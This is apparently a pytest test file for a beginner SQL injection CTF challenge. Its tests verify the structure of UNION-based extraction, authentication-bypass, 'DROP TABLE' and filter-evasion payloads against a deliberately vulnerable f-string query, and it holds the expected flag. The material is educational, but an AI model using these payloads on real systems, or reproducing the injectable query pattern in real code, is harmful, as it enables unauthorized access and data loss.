"""
Tests for SQL Injection 101 challenge.
Tests payload construction and expected behavior.
"""
import pytest
import re


class TestSQLInjectionPayloads:
    """Tests for SQL injection payload construction."""

    def test_union_payload_structure(self):
        """Test that UNION injection payload has correct structure."""
        payload = "' UNION SELECT 1,value,3,4 FROM secrets WHERE name='flag'--"

        # Should contain UNION SELECT
        assert "UNION SELECT" in payload.upper()

        # Should close the original quote
        assert payload.startswith("'")

        # Should comment out the rest
        assert "--" in payload or "#" in payload

    def test_auth_bypass_payloads(self):
        """Test authentication bypass payloads."""
        payloads = [
            "' OR '1'='1'--",
            "admin'--",  # Uses quote mid-string, not at start
            "' UNION SELECT 1,2,3,'administrator'--"
        ]

        for payload in payloads:
            # All should have a quote to break string
            assert "'" in payload
            # All should have comment marker
            assert "--" in payload or "#" in payload

    def test_union_payload_column_count(self):
        """Test that UNION payload matches expected column count."""
        # The vulnerable query: SELECT * FROM users WHERE username = '...' AND password = '...'
        # Users table has: id, username, password, role (4 columns)
        payload = "' UNION SELECT 1,value,3,4 FROM secrets WHERE name='flag'--"

        # Count SELECT values
        select_match = re.search(r'UNION SELECT ([^FROM]+)', payload, re.IGNORECASE)
        assert select_match
        values = select_match.group(1).split(',')
        assert len(values) == 4


class TestSQLInjectionPatterns:
    """Tests for SQL injection pattern detection."""

    def test_quote_escaping(self):
        """Test that payloads break out of string context."""
        payloads = [
            "' OR '1'='1'--",
            "admin'--",
            "1'; DROP TABLE users--"
        ]

        for payload in payloads:
            # Should contain unescaped single quote
            assert "'" in payload and "\\'" not in payload

    def test_comment_markers(self):
        """Test presence of SQL comment markers."""
        payloads_using_comments = [
            ("' OR 1=1--", "--"),
            ("' OR 1=1#", "#"),
            ("' OR 1=1/*", "/*"),
        ]

        for payload, comment in payloads_using_comments:
            assert comment in payload


class TestSQLInjectionDetectionBypass:
    """Tests for bypassing common SQL injection filters."""

    def test_case_variation_bypass(self):
        """Test case variation for filter bypass."""
        # Basic detection might look for 'SELECT'
        # Variations: SeLeCt, SELECT, select
        variations = ["SELECT", "select", "SeLeCt", "sElEcT"]
        # All should be valid SQL keywords
        for var in variations:
            assert var.upper() == "SELECT"

    def test_whitespace_bypass(self):
        """Test whitespace variations."""
        # Some filters detect 'UNION SELECT'
        # Bypasses: 'UNION/**/SELECT', 'UNION  SELECT'
        payloads = [
            "' UNION SELECT",
            "' UNION/**/SELECT",
            "'UNION SELECT",
        ]
        # All should contain UNION and SELECT
        for payload in payloads:
            assert "UNION" in payload.upper()
            assert "SELECT" in payload.upper()


class TestSQLInjectionFlag:
    """Tests for expected flag format."""

    def test_flag_format(self):
        """Test that expected flag matches CTF format."""
        expected_flag = "CTF{sql_1nj3ct10n_m4st3r_2024}"

        assert expected_flag.startswith("CTF{")
        assert expected_flag.endswith("}")
        assert "sql" in expected_flag.lower()

    def test_flag_extraction_pattern(self):
        """Test regex pattern for flag extraction."""
        sample_response = "Welcome admin! Your flag is CTF{sql_1nj3ct10n_m4st3r_2024}"

        match = re.search(r'CTF\{[^}]+\}', sample_response)
        assert match
        assert match.group() == "CTF{sql_1nj3ct10n_m4st3r_2024}"


class TestSQLInjectionQuery:
    """Tests for SQL query construction."""

    def test_vulnerable_query_format(self):
        """Test the vulnerable query construction."""
        username = "admin"
        password = "test"
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

        assert "WHERE username =" in query
        assert "AND password =" in query
        assert f"'{username}'" in query

    def test_injection_modifies_query(self):
        """Test that injection payload modifies query logic."""
        # Original: SELECT * FROM users WHERE username = 'X' AND password = 'Y'
        # Injected: SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = 'Y'

        payload = "' OR '1'='1'--"
        query = f"SELECT * FROM users WHERE username = '{payload}' AND password = 'x'"

        # After injection, the OR condition makes WHERE always true
        assert "OR '1'='1'" in query
        assert "--" in query


class TestAuthBypassTechniques:
    """Tests for various authentication bypass techniques."""

    def test_tautology_bypass(self):
        """Test tautology-based bypass (always true condition)."""
        tautologies = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 'a'='a",
        ]

        for payload in tautologies:
            # Should create an always-true condition
            assert "OR" in payload.upper()

    def test_comment_bypass(self):
        """Test comment-based bypass to ignore password check."""
        payload = "admin'--"
        query = f"SELECT * FROM users WHERE username = '{payload}' AND password = 'x'"

        # The -- comments out the password check
        assert query.endswith("x'")  # Password part is there but commented
        assert "--" in query
